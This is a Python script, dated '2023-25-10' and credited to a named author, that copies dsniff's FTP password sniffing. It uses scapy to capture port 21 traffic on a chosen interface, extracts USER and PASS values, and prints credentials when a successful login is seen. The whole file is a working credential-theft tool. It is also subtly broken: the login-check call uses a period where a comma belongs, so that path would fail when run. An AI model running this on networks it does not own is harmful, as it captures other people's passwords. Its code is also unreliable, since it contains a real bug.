#! /usr/bin/python3
"""
Dsniff Script
Mia Weber
2023-25-10
Replicates major functionality of official dsniff tool. Sniffs FTP packets for usernames and passwords.
Reference: https://null-byte.wonderhowto.com/how-to/build-ftp-password-sniffer-with-scapy-and-python-0169759/
"""

import sys
from logging import getLogger, ERROR
from scapy.all import *

getLogger('scapy.runtime').setLevel(ERROR)

interface = sys.argv[1] # Get the interface type from the command line

usernames = ['Error: empty'] # Array to store username info
passwords = ['Error: empty'] # Array to store password info

def check_login(packet, username, password):
	#print('[Debug] in check_login...')
	try:
		decoded_load=packet[Raw].load.decode('utf-8') # Add utf-8 decode logic to get it working
		if '230' in decoded_load: # If the login was successful it returns 230
			print('[*] Valid Credentials Found...')
			print('\t[*] ' + str(packet[IP].dst).strip() + ' -> ' + str(packet[IP].src).strip() + ':')
			print('\t [*] Username: ' + username) # Print the username
			print('\t [*] Password: ' + password + '\n') # Print the password
			return
		else:
			return
	except Exception:
		return

def check_for_ftp(packet): # Determine if a packet is a FTP packet
	if packet.haslayer(TCP) and packet.haslayer(Raw):
		if packet[TCP].dport == 21 or packet[TCP].sport == 21: # Is it coming from or going to port 21?
			return True
		else:
			return False
	else:
		return False

def check_packet(packet):
	#print('[Debug] Checking packet...')
	if check_for_ftp(packet):
		#print('[Debug] FTP Packet Found...')
		pass
	else:
		return
	data = packet[Raw].load.decode('utf-8') # Another place where decoding is necessary!
	if 'USER' in data: # Find user data? add info to array
		#print('[Debug] Found User...')
		usernames.append(data.split('USER ')[1].strip())
	elif 'PASS' in data: # Find pass data? add info to array
		#print('[Debug] Found Pass...')
		passwords.append(data.split('PASS ')[1].strip())
	else:
		check_login(packet, usernames[-1]. passwords[-1]) # Check to verify that the credentials found are valid
	return

print('[*] Sniffing started on %s ... \n' % interface)
try:
	sniff(iface=interface, prn=check_packet, store=0) # Start the sniffing
except Exception as e:
	print(f'[!] Error: Failed to Initialize Sniffing, {e}')
	sys.exit(1)
print('\n[*] Sniffing Stopped')
